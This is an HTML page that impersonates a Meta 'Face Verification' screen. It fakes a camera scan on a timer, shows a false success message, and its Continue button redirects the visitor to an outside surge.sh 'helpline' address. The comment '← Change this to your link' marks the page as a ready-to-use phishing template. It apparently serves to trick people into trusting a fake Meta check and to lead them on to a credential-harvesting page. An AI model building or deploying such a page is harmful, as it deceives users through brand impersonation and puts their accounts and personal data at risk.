
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Face Verification - Meta</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #f0f2f5, #d9dfe8);
            font-family: 'Inter', system-ui, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1c1e21;
        }

        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            text-align: center;
            max-width: 420px;
            width: 100%;
            border: 1px solid #dadde1;
        }

        .header {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .subheader {
            color: #65676b;
            font-size: 15.5px;
            margin-bottom: 30px;
        }

        .scanner-container {
            position: relative;
            width: 200px;
            height: 200px;
            margin: 0 auto 30px;
        }

        .scanner-ring {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: conic-gradient(
                transparent 0deg,
                #1877f2 90deg,
                #00c853 180deg,
                #1877f2 270deg,
                transparent 360deg
            );
            animation: spin 2.2s linear infinite;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scanner-core {
            width: 140px;
            height: 140px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 62px;
            box-shadow: 0 0 0 8px #f0f2f5 inset;
            transition: all 0.6s ease;
        }

        .scanner-complete {
            animation: none;
            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
            border: 6px solid #2e7d32;
        }

        .face-icon {
            font-size: 68px;
            transition: all 0.5s ease;
        }

        .status-text {
            font-size: 18px;
            font-weight: 500;
            color: #1c1e21;
            margin: 15px 0;
            min-height: 28px;
        }

        .verified-text {
            display: none;
            font-size: 21px;
            font-weight: 700;
            color: #2e7d32;
            margin: 20px 0 10px;
        }

        .continue-button {
            display: none;
            width: 100%;
            padding: 14px 20px;
            background: #1877f2;
            color: white;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.2s ease;
        }

        .continue-button:hover {
            background: #166fe5;
            transform: translateY(-1px);
        }

        .footer {
            margin-top: 25px;
            font-size: 13px;
            color: #90949c;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">Face Verification</div>
        <div class="subheader">Please look at your camera to verify you're not a robot</div>

        <div class="scanner-container">
            <div class="scanner-ring" id="scannerRing">
                <div class="scanner-core" id="scannerCore">
                    <span class="face-icon" id="faceIcon">👤</span>
                </div>
            </div>
        </div>

        <div class="status-text" id="statusText">Scanning your face securely...</div>
        
        <div class="verified-text" id="verifiedText">
            ✓ Face Verified Successfully
        </div>

        <button class="continue-button" id="continueBtn">Continue</button>

        <div class="footer">
            Meta • Secure Face Authentication
        </div>
    </div>

    <audio id="successSound" preload="auto">
        <source src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" type="audio/mpeg">
    </audio>

    <script>
        const redirectURL = "https://review-terms-for-helpline.surge.sh/"; // ← Change this to your link

        setTimeout(() => {
            // Play success sound
            const sound = document.getElementById("successSound");
            sound.volume = 0.7;
            sound.play().catch(() => {});

            // Complete the scanner animation
            const ring = document.getElementById("scannerRing");
            const core = document.getElementById("scannerCore");
            const faceIcon = document.getElementById("faceIcon");

            ring.classList.add("scanner-complete");
            faceIcon.textContent = "✅";
            faceIcon.style.fontSize = "72px";

            // Show verified message and button
            document.getElementById("statusText").style.display = "none";
            document.getElementById("verifiedText").style.display = "block";
            document.getElementById("continueBtn").style.display = "block";
        }, 4200);

        // Continue button action
        document.getElementById("continueBtn").addEventListener("click", () => {
            window.location.href = redirectURL;
        });
    </script>
</body>
</html>
